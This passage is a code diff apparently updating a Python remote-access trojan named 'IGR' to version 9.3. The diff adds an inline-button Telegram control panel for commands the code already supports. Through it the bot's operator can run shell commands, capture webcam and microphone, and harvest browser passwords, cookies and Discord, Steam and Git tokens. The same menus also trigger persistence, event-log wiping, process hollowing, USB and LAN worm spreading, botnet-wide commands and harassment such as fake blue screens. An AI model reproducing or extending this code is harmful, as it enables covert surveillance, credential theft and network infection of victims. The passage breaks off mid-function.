@@ -11,7 +11,7 @@ TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
 KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
-IGR_VERSION = "9.2"
+IGR_VERSION = "9.3"
 
 # feature flags set during build
 FEAT_POLYMORPHISM = "BUILD_FEAT_POLYMORPHISM"
@@ -615,6 +615,48 @@ def _send_telegram_file(file_path: str, caption: str = "") -> bool:
     except:
         return False
 
+
+def _send_telegram_keyboard(text: str, buttons: list, parse_mode: str = "HTML") -> Optional[str]:
+    """Send message with inline keyboard buttons. buttons is list of lists of (label, callback_data)."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return None
+    try:
+        keyboard = {"inline_keyboard": [[{"text": lbl, "callback_data": cb} for lbl, cb in row] for row in buttons]}
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode, "reply_markup": keyboard}
+        resp = requests.post(url, json=payload, timeout=15)
+        if resp.status_code == 200:
+            return str(resp.json().get("result", {}).get("message_id", ""))
+        return None
+    except:
+        return None
+
+
+def _edit_telegram_keyboard(message_id: str, text: str, buttons: list, parse_mode: str = "HTML") -> bool:
+    """Edit existing message with new inline keyboard."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        keyboard = {"inline_keyboard": [[{"text": lbl, "callback_data": cb} for lbl, cb in row] for row in buttons]}
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text, "parse_mode": parse_mode, "reply_markup": keyboard}
+        resp = requests.post(url, json=payload, timeout=15)
+        return resp.status_code == 200
+    except:
+        return False
+
+
+def _answer_callback_query(callback_query_id: str, text: str = "") -> bool:
+    """Acknowledge a Telegram inline button press to remove the loading spinner."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_"):
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+        resp = requests.post(url, json={"callback_query_id": callback_query_id, "text": text}, timeout=10)
+        return resp.status_code == 200
+    except:
+        return False
+
 def _load_telegram_state() -> dict:
     """Load Telegram message state from local file."""
     try:
@@ -734,6 +776,7 @@ def _send_telegram_full_report(cloudflared_url: str) -> bool:
             }
             _save_telegram_state(state)
             _send_keylog_to_telegram()
+            _send_menu("main")
             return True
         return _send_telegram(msg_text)
     except:
@@ -798,6 +841,7 @@ def _save_tg_last_update_id(update_id: int):
 
 _TG_CMD_LAST_UPDATE_ID = _load_tg_last_update_id()
 _TG_PENDING_ACTION = None
+_TG_PENDING_TEXT_ACTION = None
 _TG_STARTUP_TIME = time.time()
 _TG_DANGEROUS_CMDS = {"/logoff", "/lock", "/reboot", "/shutdown", "/panic", "/hibernate"}
 
@@ -829,7 +873,7 @@ def _telegram_command_listener():
     while True:
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-            params = {"offset": _TG_CMD_LAST_UPDATE_ID + 1, "timeout": 30, "allowed_updates": ["message"]}
+            params = {"offset": _TG_CMD_LAST_UPDATE_ID + 1, "timeout": 30, "allowed_updates": ["message", "callback_query"]}
             resp = requests.get(url, params=params, timeout=40)
             if resp.status_code != 200:
                 time.sleep(5)
@@ -838,13 +882,25 @@ def _telegram_command_listener():
             for update in updates:
                 _TG_CMD_LAST_UPDATE_ID = update.get("update_id", _TG_CMD_LAST_UPDATE_ID)
                 _save_tg_last_update_id(_TG_CMD_LAST_UPDATE_ID)
+
+                if "callback_query" in update:
+                    cq = update["callback_query"]
+                    cq_chat = str(cq.get("message", {}).get("chat", {}).get("id", ""))
+                    if cq_chat == str(TELEGRAM_CHAT_ID):
+                        _answer_callback_query(cq["id"])
+                        _handle_telegram_command(cq["data"])
+                    continue
+
                 msg = update.get("message", {})
                 chat_id = str(msg.get("chat", {}).get("id", ""))
                 if chat_id != str(TELEGRAM_CHAT_ID):
                     continue
                 text = msg.get("text", "").strip()
                 if text:
-                    _handle_telegram_command(text)
+                    if _TG_PENDING_TEXT_ACTION:
+                        _handle_pending_text(text)
+                    else:
+                        _handle_telegram_command(text)
                     continue
                 if _TG_PENDING_ACTION:
                     _handle_telegram_file(msg)
@@ -856,9 +912,160 @@ def _telegram_command_listener():
                 pass
             time.sleep(5)
 
+
+_TG_MENU_PAGES = {
+    "main": {
+        "text": "<b>IGR Control Panel</b>\nSelect a category:",
+        "buttons": [
+            [("📸 Screen", "/menu_screen"), ("🎥 Webcam", "/webcam"), ("🎤 Mic 10s", "/mic 10")],
+            [("💻 Shell", "/menu_shell"), ("📁 Files", "/menu_files"), ("🔑 Harvest", "/menu_harvest")],
+            [("👻 Troll", "/menu_troll"), ("🕵️ Stealth", "/menu_stealth"), ("🔥 Spread", "/menu_spread")],
+            [("📊 Info", "/menu_info"), ("🤖 Botnet", "/menu_botnet"), ("☠️ Danger", "/menu_danger")],
+        ],
+    },
+    "screen": {
+        "text": "<b>Screen & Media</b>",
+        "buttons": [
+            [("📸 Screenshot", "/screen"), ("🎥 Webcam Photo", "/webcam")],
+            [("🎤 Record 10s", "/mic 10"), ("🎤 Record 30s", "/mic 30")],
+            [("🔊 Volume 0", "/volume 0"), ("🔊 Volume 50", "/volume 50"), ("🔊 Volume 100", "/volume 100")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+    "shell": {
+        "text": "<b>Shell</b>\nSend any text after this to run as a command.\nOr use quick actions:",
+        "buttons": [
+            [("👤 whoami", "/shell whoami"), ("💾 dir C:\\", "/shell dir C:\\")],
+            [("⚙️ ipconfig", "/shell ipconfig"), ("📋 tasklist", "/shell tasklist")],
+            [("🌐 netstat -an", "/shell netstat -an"), ("🔍 arp -a", "/shell arp -a")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+    "files": {
+        "text": "<b>Files</b>",
+        "buttons": [
+            [("📂 ls Desktop", "/ls_path C:\\Users\\Public\\Desktop"), ("📂 ls AppData", "/ls_path " + os.path.join(os.environ.get("APPDATA", ""), ""))],
+            [("📥 Download file", "/menu_download_prompt"), ("🔍 Search .pdf", "/filesearch C:\\ .pdf")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+    "harvest": {
+        "text": "<b>Harvest Credentials</b>",
+        "buttons": [
+            [("🔑 Chrome", "/chrome"), ("🔑 Edge", "/edge"), ("🦊 Firefox", "/firefox")],
+            [("📋 Autofill", "/autofill"), ("🍪 Cookies", "/cookies"), ("📜 History", "/history")],
+            [("🎮 Discord", "/discord"), ("🎮 Steam", "/steam"), ("⛏️ Minecraft", "/minecraft")],
+            [("🎵 Spotify", "/spotify"), ("🔧 Git", "/git"), ("📡 WiFi", "/wifi")],
+            [("📎 Clipboard", "/clipboard"), ("💽 USB History", "/usb"), ("🌐 Connections", "/connections")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+    "troll": {
+        "text": "<b>Troll Actions</b>",
+        "buttons": [
+            [("💥 Fake BSOD", "/bsod"), ("🪟 Fake Update", "/winupdate"), ("🛑 Dismiss", "/fakedismiss")],
+            [("❄️ Freeze Screen", "/freeze"), ("🔓 Unfreeze", "/unfreeze")],
+            [("💬 Popup", "/popup_prompt"), ("⌨️ Ghost Type", "/ghosttype_prompt")],
+            [("🖱️ Jitter On", "/jitter"), ("🖱️ Jitter Off", "/jitterstop")],
+            [("🔀 Reverse Mouse", "/reversemouse"), ("↩️ Restore Mouse", "/restoremouse"), ("🔄 Swap Buttons", "/swapmouse")],
+            [("🖥️ Hide Desktop", "/hidedesktop"), ("🖥️ Show Desktop", "/showdesktop")],
+            [("📌 Hide Taskbar", "/hidetaskbar"), ("📌 Show Taskbar", "/showtaskbar")],
+            [("💿 Eject Tray", "/ejecttray"), ("💿 Close Tray", "/closetray")],
+            [("📵 Monitor Off", "/monitoroff"), ("🖥️ Monitor On", "/monitoron")],
+            [("🔊 Speak", "/speak_prompt"), ("🔙 Back", "/menu")],
+        ],
+    },
+    "stealth": {
+        "text": "<b>Stealth & Persistence</b>",
+        "buttons": [
+            [("🧬 Internal Spread", "/spread"), ("🔒 Registry Persist", "/registrypersist")],
+            [("📋 Safe Mode Persist", "/safemode"), ("🎯 Process Hollow", "/hollow")],
+            [("🗑️ Wipe Event Logs", "/wipelogs"), ("⚙️ Spoof Process", "/spoof")],
+            [("📡 Persistence Status", "/persistence"), ("🔙 Back", "/menu")],
+        ],
+    },
+    "spread": {
+        "text": "<b>Spreading</b>",
+        "buttons": [
+            [("💾 USB Spread", "/spreadusb"), ("🌐 LAN Spread", "/spreadlan")],
+            [("🏫 Aggressive LAN", "/spreadlan_aggressive"), ("🔙 Back", "/menu")],
+        ],
+    },
+    "info": {
+        "text": "<b>System Information</b>",
+        "buttons": [
+            [("ℹ️ System Info", "/info"), ("📊 Status", "/status"), ("🌍 Geo IP", "/geo")],
+            [("⚙️ Sysinfo", "/sysinfo"), ("💾 Disks", "/disks"), ("🚀 Startup", "/startup")],
+            [("📅 Tasks", "/tasks"), ("📱 Apps", "/apps"), ("🌐 Network", "/network")],
+            [("⚡ Processes", "/proc"), ("🔙 Back", "/menu")],
+        ],
+    },
+    "botnet": {
+        "text": "<b>Botnet C2</b>",
+        "buttons": [
+            [("📋 List all bots", "/botnet list"), ("📸 All screenshots", "/botnet all /screen")],
+            [("💻 All shell", "/botnet_shell_prompt"), ("🔑 All harvest", "/botnet all /chrome")],
+            [("📡 All WiFi", "/botnet all /wifi"), ("📊 All status", "/botnet all /status")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+    "danger": {
+        "text": "<b>⚠️ Danger Zone</b>\nThese actions are destructive or risky.",
+        "buttons": [
+            [("🔄 Reboot", "/reboot"), ("⚡ Shutdown", "/shutdown"), ("😴 Hibernate", "/hibernate")],
+            [("🔒 Lock Screen", "/lock"), ("🚪 Logoff", "/logoff")],
+            [("💀 PANIC / Self-Destruct", "/panic")],
+            [("🔙 Back", "/menu")],
+        ],
+    },
+}
+
+
+def _send_menu(page: str = "main"):
+    """Send an inline keyboard menu page."""
+    menu = _TG_MENU_PAGES.get(page, _TG_MENU_PAGES["main"])
+    _send_telegram_keyboard(menu["text"], menu["buttons"])
+
+
+def _handle_pending_text(text: str):
+    """Handle free-text input when a text-prompt action is pending."""
+    global _TG_PENDING_TEXT_ACTION
+    action = _TG_PENDING_TEXT_ACTION
+    _TG_PENDING_TEXT_ACTION = None
+    _NO_WINDOW = 0x08000000
+    try:
+        if action == "shell":
+            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=30, creationflags=_NO_WINDOW)
+            output = ((result.stdout or "") + (result.stderr or ""))[:4000]
+            _send_telegram(f"<b>$ {text}</b>\n<pre>{output}</pre>")
+        elif action == "ghosttype":
+            subprocess.run(['powershell', '-Command',
+                f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{text}")'],
+                creationflags=_NO_WINDOW, close_fds=True)
+            _send_telegram(f"Ghost typed: {text}")
+        elif action == "popup":
+            subprocess.Popen(['powershell', '-Command',
+                f'[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); [System.Windows.Forms.MessageBox]::Show("{text}", "System", "OK", "Information")'],
+                creationflags=_NO_WINDOW)
+            _send_telegram(f"Popup shown: {text}")
+        elif action == "speak":
+            subprocess.run(['powershell', '-Command',
+                f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{text}")'],
+                creationflags=_NO_WINDOW, close_fds=True)
+            _send_telegram(f"Spoken: {text}")
+        elif action == "botnet_shell":
+            _handle_telegram_command(f"/botnet all /shell {text}")
+        elif action == "ls_path":
+            _handle_telegram_command(f"/ls_path {text}")
+        else:
+            _send_telegram(f"Unknown pending action: {action}")
+    except Exception as e:
+        _send_telegram(f"Action failed: {e}")
+
+
 def _handle_telegram_command(text: str):
     """Process a single Telegram command and respond."""
-    global _TG_PENDING_ACTION
+    global _TG_PENDING_ACTION, _TG_PENDING_TEXT_ACTION
     try:
         with open(os.path.join(KEYLOG_DIR, "_tg_error.log"), 'a') as f:
             f.write(f"{datetime.now().isoformat()} RECV: {text[:100]}\n")
@@ -876,7 +1083,7 @@ def _handle_telegram_command(text: str):
     if cmd == "/help":
         _send_telegram(
             "<b>IGR Commands</b>\n"
-            "/help - This message\n"
+            "/menu - Interactive button panel\n"
             "/info - System info\n"
             "/screen - Screenshot\n"
             "/webcam - Webcam photo\n"
@@ -888,46 +1095,80 @@ def _handle_telegram_command(text: str):
             "/kill &lt;pid&gt; - Kill process\n"
             "/upload &lt;path&gt; - Upload file\n"
             "/cd &lt;path&gt; - Change directory\n"
-            "/ls - List current directory\n"
+            "/ls - List current dir\n"
+            "/ls_path &lt;path&gt; - List any dir\n"
             "/volume &lt;0-100&gt; - Set volume\n"
             "/notify &lt;text&gt; - Show notification\n"
-            "/reboot - Reboot machine\n"
-            "/shutdown - Shutdown machine\n"
-            "/panic - Self destruct\n"
             "/url - Dashboard URL\n"
             "/chrome - Chrome passwords\n"
+            "/edge - Edge passwords\n"
             "/firefox - Firefox passwords\n"
-            "/autofill - Browser autofill data\n"
+            "/cookies - Browser cookies\n"
+            "/autofill - Browser autofill\n"
             "/discord - Discord tokens\n"
-            "/steam - Steam session data\n"
-            "/minecraft - Minecraft launcher tokens\n"
-            "/spotify - Spotify credentials\n"
+            "/steam - Steam session\n"
+            "/minecraft - Minecraft tokens\n"
+            "/spotify - Spotify creds\n"
             "/git - Git credentials\n"
-            "/clipboard - Clipboard content\n"
+            "/clipboard - Clipboard\n"
             "/history - Browser history\n"
-            "/network - Network info + LAN scan\n"
-            "/connections - Live TCP/UDP connections\n"
+            "/network - Network + LAN scan\n"
+            "/connections - TCP/UDP connections\n"
             "/usb - USB device history\n"
             "/sysinfo - Detailed system info\n"
             "/startup - Startup programs\n"
             "/tasks - Scheduled tasks\n"
             "/disks - Disk drives\n"
-            "/lock - Lock screen\n"
-            "/logoff - Log off user\n"
-            "/hibernate - Hibernate\n"
+            "/filesearch &lt;root&gt; &lt;pattern&gt; - Search files\n"
+            "/persistence - Show persistence status\n"
+            "/registrypersist - Add registry Run key\n"
+            "/spoof - Spoof process name\n"
+            "/safemode - Safe Mode persist\n"
+            "/wipelogs - Wipe event logs\n"
+            "/hollow [process] - Process hollowing\n"
+            "/spread - Internal spread copies\n"
+            "/spreadusb - Infect USB drives\n"
+            "/spreadlan - LAN SMB spread\n"
+            "/spreadlan_aggressive - Aggressive LAN worm\n"
+            "/freeze [color] - Freeze screen\n"
+            "/unfreeze - Unfreeze screen\n"
+            "/bsod - Fake blue screen\n"
+            "/winupdate - Fake Windows Update\n"
+            "/fakedismiss - Dismiss fake screens\n"
+            "/popup &lt;type&gt; &lt;title&gt; &lt;msg&gt; - Show popup\n"
+            "/ghosttype &lt;text&gt; - Type on victim keyboard\n"
+            "/jitter - Mouse jitter on\n"
+            "/jitterstop - Mouse jitter off\n"
+            "/reversemouse - Reverse mouse\n"
+            "/restoremouse - Restore mouse\n"
+            "/swapmouse - Swap mouse buttons\n"
+            "/hidedesktop - Hide desktop icons\n"
+            "/showdesktop - Show desktop icons\n"
+            "/hidetaskbar - Hide taskbar\n"
+            "/showtaskbar - Show taskbar\n"
+            "/monitoroff - Turn monitor off\n"
+            "/monitoron - Turn monitor on\n"
+            "/ejecttray - Eject CD tray\n"
+            "/closetray - Close CD tray\n"
             "/speak &lt;text&gt; - Text to speech\n"
             "/speak - Send audio file to play\n"
-            "/wallpaper - Send image to set as wallpaper\n"
+            "/wallpaper - Send image for wallpaper\n"
             "/browser &lt;url&gt; - Open in browser\n"
             "/status - Quick status\n"
             "/mic [secs] - Record microphone\n"
             "/geo - Geo location from IP\n"
             "/apps - Installed applications\n"
-            "/spread - Internal spread copies\n"
-            "/safemode - Safe Mode persistence\n"
-            "/wipelogs - Wipe event logs\n"
-            "/hollow [process] - Process hollowing\n"
-            "/cancel - Cancel pending file upload"
+            "/update - Self-update from URL\n"
+            "/botnet list - List this bot\n"
+            "/botnet all &lt;cmd&gt; - Command all bots\n"
+            "/botnet &lt;host&gt; &lt;cmd&gt; - Command one bot\n"
+            "/lock - Lock screen\n"
+            "/logoff - Log off user\n"
+            "/reboot - Reboot machine\n"
+            "/shutdown - Shutdown machine\n"
+            "/hibernate - Hibernate\n"
+            "/panic - Self destruct\n"
+            "/cancel - Cancel pending action"
         )
 
     elif cmd == "/info":
@@ -1485,7 +1726,387 @@ def _handle_telegram_command(text: str):
 
     elif cmd == "/cancel":
         _TG_PENDING_ACTION = None
+        _TG_PENDING_TEXT_ACTION = None
         _send_telegram("Pending action cancelled")
+
+    elif cmd == "/menu":
+        _send_menu("main")
+
+    elif cmd == "/menu_screen":
+        _send_menu("screen")
+
+    elif cmd == "/menu_shell":
+        _TG_PENDING_TEXT_ACTION = "shell"
+        _send_telegram("Type your shell command:")
+
+    elif cmd == "/menu_files":
+        _send_menu("files")
+
+    elif cmd == "/menu_harvest":
+        _send_menu("harvest")
+
+    elif cmd == "/menu_troll":
+        _send_menu("troll")
+
+    elif cmd == "/menu_stealth":
+        _send_menu("stealth")
+
+    elif cmd == "/menu_spread":
+        _send_menu("spread")
+
+    elif cmd == "/menu_info":
+        _send_menu("info")
+
+    elif cmd == "/menu_botnet":
+        _send_menu("botnet")
+
+    elif cmd == "/menu_danger":
+        _send_menu("danger")
+
+    elif cmd == "/popup_prompt":
+        _TG_PENDING_TEXT_ACTION = "popup"
+        _send_telegram("Type popup message text:")
+
+    elif cmd == "/ghosttype_prompt":
+        _TG_PENDING_TEXT_ACTION = "ghosttype"
+        _send_telegram("Type text to ghost-type on victim keyboard:")
+
+    elif cmd == "/speak_prompt":
+        _TG_PENDING_TEXT_ACTION = "speak"
+        _send_telegram("Type text to speak on victim speakers:")
+
+    elif cmd == "/botnet_shell_prompt":
+        _TG_PENDING_TEXT_ACTION = "botnet_shell"
+        _send_telegram("Type shell command to run on ALL bots:")
+
+    elif cmd == "/botnet":
+        hostname = socket.gethostname()
+        sub_parts = args.split(maxsplit=1)
+        sub_cmd = sub_parts[0].lower() if sub_parts else "list"
+        sub_args = sub_parts[1] if len(sub_parts) > 1 else ""
+        if sub_cmd == "list":
+            uptime_sec = int(time.time() - _TG_STARTUP_TIME)
+            _send_telegram(f"[{hostname}] online | uptime {uptime_sec//3600}h{uptime_sec%3600//60}m | {CLOUDFLARED_PUBLIC_URL}")
+        elif sub_cmd == "all":
+            if sub_args:
+                _send_telegram(f"[{hostname}] executing: {sub_args}")
+                _handle_telegram_command(sub_args)
+        elif sub_cmd == hostname.lower():
+            if sub_args:
+                _handle_telegram_command(sub_args)
+        else:
+            _send_telegram(f"[{hostname}] ignoring - targeted at: {sub_cmd}")
+
+    elif cmd == "/edge":
+        try:
+            passwords = _decrypt_edge_passwords()
+            if passwords:
+                _send_telegram(f"<b>Edge Passwords</b>\n<pre>{chr(10).join(passwords[:30])[:4000]}</pre>")
+            else:
+                _send_telegram("No Edge passwords found")
+        except:
+            _send_telegram("Edge dump failed")
+
+    elif cmd == "/cookies":
+        try:
+            data = _steal_browser_cookies()
+            if data:
+                _send_telegram(f"<b>Browser Cookies</b>\n<pre>{chr(10).join(data[:40])[:4000]}</pre>")
+            else:
+                _send_telegram("No cookies found")
+        except:
+            _send_telegram("Cookies dump failed")
+
+    elif cmd == "/popup":
+        parts2 = args.split(maxsplit=2) if args else []
+        popup_type = parts2[0] if len(parts2) > 0 else "normal"
+        popup_title = parts2[1] if len(parts2) > 1 else "System"
+        popup_text = parts2[2] if len(parts2) > 2 else "Hello"
+        try:
+            subprocess.Popen(['powershell', '-Command',
+                f'[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); [System.Windows.Forms.MessageBox]::Show("{popup_text}","{popup_title}","OK","Information")'],
+                creationflags=_NO_WINDOW)
+            _send_telegram(f"Popup shown ({popup_type}): {popup_text}")
+        except:
+            _send_telegram("Popup failed")
+
+    elif cmd == "/freeze":
+        try:
+            color = args.strip().lower() if args.strip() else "black"
+            ps = f'Add-Type -AssemblyName System.Windows.Forms; $f=New-Object System.Windows.Forms.Form; $f.WindowState="Maximized"; $f.FormBorderStyle="None"; $f.TopMost=$true; $f.BackColor="{color}"; $f.ShowDialog()'
+            subprocess.Popen(['powershell', '-Command', ps], creationflags=_NO_WINDOW)
+            _send_telegram(f"Screen frozen ({color})")
+        except:
+            _send_telegram("Freeze failed")
+
+    elif cmd == "/unfreeze":
+        try:
+            subprocess.run(['taskkill', '/f', '/im', 'powershell.exe'], capture_output=True, creationflags=_NO_WINDOW)
+            _send_telegram("Screen unfrozen")
+        except:
+            _send_telegram("Unfreeze failed")
+
+    elif cmd == "/bsod":
+        try:
+            html = '<html><head><hta:application id="b" applicationname="b" border="none" caption="no" contextmenu="no" maximizebutton="no" minimizebutton="no" scroll="no" showintaskbar="no" singleinstance="no" sysmenu="no" windowstate="maximize"/><script>window.resizeTo(screen.width,screen.height);</script></head><body style="background:#0078D7;color:white;font-family:Segoe UI;margin:0;padding:60px 80px;overflow:hidden;cursor:none;"><div style="font-size:120px;">:(</div><br><div style="font-size:24px;">Your PC ran into a problem and needs to restart.</div><br><div style="font-size:18px;">Stop code: CRITICAL_PROCESS_DIED</div></body></html>'
+            tmp = os.path.join(KEYLOG_DIR, "_bsod.hta")
+            with open(tmp, 'w') as f:
+                f.write(html)
+            subprocess.Popen(['mshta.exe', tmp], creationflags=_NO_WINDOW)
+            _send_telegram("Fake BSOD shown")
+        except:
+            _send_telegram("BSOD failed")
+
+    elif cmd == "/winupdate":
+        try:
+            html = '<html><head><hta:application id="u" applicationname="u" border="none" caption="no" contextmenu="no" maximizebutton="no" minimizebutton="no" scroll="no" showintaskbar="no" singleinstance="no" sysmenu="no" windowstate="maximize"/></head><body style="background:#1a1a2e;color:white;font-family:Segoe UI;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;cursor:none;"><div style="text-align:center;"><div style="font-size:72px;">&#9881;</div><div style="font-size:28px;margin:20px 0;">Working on updates</div><div style="font-size:18px;color:#aaa;">Do not turn off your PC.</div><div style="font-size:48px;margin-top:40px;">0%</div></div></body></html>'
+            tmp = os.path.join(KEYLOG_DIR, "_winupdate.hta")
+            with open(tmp, 'w') as f:
+                f.write(html)
+            subprocess.Popen(['mshta.exe', tmp], creationflags=_NO_WINDOW)
+            _send_telegram("Fake Windows Update shown")
+        except:
+            _send_telegram("Fake update failed")
+
+    elif cmd == "/fakedismiss":
+        try:
+            subprocess.run(['taskkill', '/f', '/im', 'mshta.exe'], capture_output=True, creationflags=_NO_WINDOW)
+            _send_telegram("Fake screen dismissed")
+        except:
+            _send_telegram("Dismiss failed")
+
+    elif cmd == "/ghosttype":
+        if not args:
+            _TG_PENDING_TEXT_ACTION = "ghosttype"
+            _send_telegram("Type text to ghost-type:")
+            return
+        try:
+            subprocess.run(['powershell', '-Command',
+                f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{args}")'],
+                creationflags=_NO_WINDOW, close_fds=True)
+            _send_telegram(f"Ghost typed: {args}")
+        except:
+            _send_telegram("Ghost type failed")
+
+    elif cmd == "/jitter":
+        try:
+            script = os.path.join(KEYLOG_DIR, "_jitter.ps1")
+            with open(script, 'w') as f:
+                f.write('Add-Type -AssemblyName System.Windows.Forms\nwhile($true){$p=[System.Windows.Forms.Cursor]::Position;$p.X+=(Get-Random -Min -5 -Max 5);$p.Y+=(Get-Random -Min -5 -Max 5);[System.Windows.Forms.Cursor]::Position=$p;Start-Sleep -Milliseconds 200}')
+            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', script], creationflags=_NO_WINDOW)
+            _send_telegram("Mouse jitter started")
+        except:
+            _send_telegram("Jitter failed")
+
+    elif cmd == "/jitterstop":
+        try:
+            subprocess.run(['taskkill', '/f', '/im', 'powershell.exe'], capture_output=True, creationflags=_NO_WINDOW)
+            _send_telegram("Mouse jitter stopped")
+        except:
+            _send_telegram("Jitter stop failed")
+
+    elif cmd == "/reversemouse":
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "1")
+            winreg.CloseKey(key)
+            import ctypes
+            ctypes.windll.user32.SwapMouseButton(True)
+            _send_telegram("Mouse reversed")
+        except:
+            _send_telegram("Reverse mouse failed")
+
+    elif cmd == "/restoremouse":
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "SwapMouseButtons", 0, winreg.REG_SZ, "0")
+            winreg.CloseKey(key)
+            import ctypes
+            ctypes.windll.user32.SwapMouseButton(False)
+            _send_telegram("Mouse restored")
+        except:
+            _send_telegram("Restore mouse failed")
+
+    elif cmd == "/swapmouse":
+        try:
+            import ctypes
+            ctypes.windll.user32.SwapMouseButton(True)
+            _send_telegram("Mouse buttons swapped")
+        except:
+            _send_telegram("Swap mouse failed")
+
+    elif cmd == "/hidedesktop":
+        try:
+            subprocess.run(['powershell', '-Command',
+                '$p="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"; Set-ItemProperty $p HideIcons 1; Stop-Process -Name explorer -Force; Start-Process explorer'],
+                creationflags=_NO_WINDOW, capture_output=True)
+            _send_telegram("Desktop icons hidden")
+        except:
+            _send_telegram("Hide desktop failed")
+
+    elif cmd == "/showdesktop":
+        try:
+            subprocess.run(['powershell', '-Command',
+                '$p="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"; Set-ItemProperty $p HideIcons 0; Stop-Process -Name explorer -Force; Start-Process explorer'],
+                creationflags=_NO_WINDOW, capture_output=True)
+            _send_telegram("Desktop icons shown")
+        except:
+            _send_telegram("Show desktop failed")
+
+    elif cmd == "/hidetaskbar":
+        try:
+            import ctypes
+            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+            _send_telegram("Taskbar hidden")
+        except:
+            _send_telegram("Hide taskbar failed")
+
+    elif cmd == "/showtaskbar":
+        try:
+            import ctypes
+            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            ctypes.windll.user32.ShowWindow(hwnd, 5)
+            _send_telegram("Taskbar shown")
+        except:
+            _send_telegram("Show taskbar failed")
+
+    elif cmd == "/ejecttray":
+        try:
+            subprocess.run(['powershell', '-Command',
+                '$sh=New-Object -ComObject Shell.Application; $sh.Namespace(17).Self.InvokeVerb("Eject")'],
+                creationflags=_NO_WINDOW, capture_output=True)
+            _send_telegram("CD tray ejected")
+        except:
+            _send_telegram("Eject failed")
+
+    elif cmd == "/closetray":
+        try:
+            subprocess.run(['powershell', '-Command',
+                'Add-Type -TypeDefinition "using System.Runtime.InteropServices;public class T{[DllImport(\\"winmm.dll\\")]public static extern int mciSendString(string a,string b,int c,int d);}"; [T]::mciSendString("set CDAudio door closed",$null,0,0)'],
+                creationflags=_NO_WINDOW, capture_output=True)
+            _send_telegram("CD tray closed")
+        except:
+            _send_telegram("Close tray failed")
+
+    elif cmd == "/monitoroff":
+        try:
+            import ctypes
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
+            _send_telegram("Monitor turned off")
+        except:
+            _send_telegram("Monitor off failed")
+
+    elif cmd == "/monitoron":
+        try:
+            import ctypes
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
+            _send_telegram("Monitor turned on")
+        except:
+            _send_telegram("Monitor on failed")
+
+    elif cmd == "/spreadusb":
+        try:
+            result = _spread_to_usb()
+            _send_telegram(f"USB spread: {result['copied']} drives infected of {result['drives']}")
+        except:
+            _send_telegram("USB spread failed")
+
+    elif cmd == "/spreadlan":
+        try:
+            result = _spread_on_lan()
+            _send_telegram(f"LAN spread: {result['infected']}/{len(result['targets'])} hosts infected")
+        except:
+            _send_telegram("LAN spread failed")
+
+    elif cmd == "/spreadlan_aggressive":
+        try:
+            result = _spread_on_lan_aggressive()
+            log_lines = result.get('log', [])[:10]
+            _send_telegram(f"Aggressive LAN: {result['infected']}/{len(result['targets'])} hosts\n" + "\n".join(log_lines))
+        except:
+            _send_telegram("Aggressive LAN spread failed")
+
+    elif cmd == "/filesearch":
+        parts2 = args.split(maxsplit=1) if args else []
+        root = parts2[0] if parts2 else "C:\\"
+        pattern = parts2[1] if len(parts2) > 1 else ".pdf"
+        try:
+            results = _search_files(root, pattern, max_results=30)
+            if results:
+                _send_telegram(f"<b>Search '{pattern}' in {root}</b>\n<pre>{chr(10).join(results[:30])[:4000]}</pre>")
+            else:
+                _send_telegram(f"No files matching '{pattern}' found in {root}")
+        except:
+            _send_telegram("File search failed")
+
+    elif cmd == "/ls_path":
+        if not args:
+            _send_telegram("Usage: /ls_path <path>")
+            return
+        try:
+            target = args.strip().strip('"')
+            entries = os.listdir(target)
+            dirs = [e for e in entries if os.path.isdir(os.path.join(target, e))]
+            files = [e for e in entries if os.path.isfile(os.path.join(target, e))]
+            listing = f"<b>{target}</b>\n"
